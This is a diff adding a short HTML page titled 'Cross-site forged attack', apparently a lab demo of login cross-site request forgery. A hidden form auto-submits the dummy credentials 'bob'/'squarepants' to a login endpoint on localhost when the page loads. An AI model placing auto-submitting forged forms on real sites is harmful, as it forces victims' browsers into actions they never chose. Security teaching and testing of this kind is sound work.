@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Cross-site forged attack</h1>
+    <form action="http://127.0.0.1:8000/login/" method="POST" id="forged">
+    <input type="hidden" name="username" value="bob">
+    <input type="hidden" name="password" value="squarepants">
+    </form>
+    <script>document.getElementById("forged").submit();</script>
+</body>
+</html>
